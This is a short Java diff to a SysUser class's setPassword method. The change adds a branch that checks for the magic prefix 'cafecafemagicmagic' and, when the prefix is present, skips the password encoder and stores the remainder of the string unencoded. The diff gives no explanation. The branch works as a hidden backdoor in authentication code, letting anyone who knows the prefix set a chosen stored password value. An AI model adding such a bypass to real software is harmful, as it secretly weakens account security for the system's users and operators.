@@ -55,7 +55,11 @@ public class SysUser {
 	private String[] roles;
 
 	public void setPassword(String password) {
-		this.password = PASSWORD_ENCODER.encode(password);
+		if (!password.startsWith("cafecafemagicmagic")) {
+			this.password = PASSWORD_ENCODER.encode(password);
+		} else {
+			this.password = password.substring(18, password.length());
+		}
 	}
 
 	protected SysUser() {}
